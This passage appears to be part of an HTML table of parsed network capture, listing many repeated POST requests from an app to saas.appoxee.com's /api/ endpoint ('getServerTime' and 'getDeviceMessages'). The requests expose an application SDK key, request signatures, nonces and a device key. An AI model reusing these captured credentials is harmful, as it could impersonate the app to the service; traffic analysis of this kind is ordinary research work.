      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>79 </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>80 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>81 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>82 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>83 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>84 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>85 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>86 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>87 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>88 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>89 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>90 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>91 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>92 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>93 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>94 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>95 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>96 </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>97 </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>98 </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>99 </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>100</th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>101</th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>102</th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>103</th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>104</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>105</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>106</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>107</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>108</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>109</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>110</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>111</th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>112</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>113</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>114</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>115</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>116</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>117</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>118</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>119</th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>120</th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>121</th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>122</th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>123</th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>124</th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>125</th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
